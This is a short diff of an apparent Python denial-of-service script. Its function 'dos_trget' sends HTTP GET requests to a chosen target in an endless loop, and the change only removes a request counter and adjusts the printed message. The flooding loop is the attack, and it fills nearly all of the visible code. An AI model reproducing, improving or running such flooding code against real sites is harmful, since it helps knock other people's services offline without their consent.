@@ -29,7 +29,6 @@ except:
     exit("missing lib: time")
 #
 op_sy = sys.platform
-x = 0 
 #
 def clear():
     if op_sy == ("linux"):
@@ -40,10 +39,9 @@ def clear():
 def dos_trget(target):
 #
     while True:
-        x += 1
         try:
             rves = requests.get(target)
-            print(f"Request sented {x} to {target}")
+            print(f"Request sented to {target}")
 #
         except requests.exceptions.ConnectionError:
             print("Check internet connection")
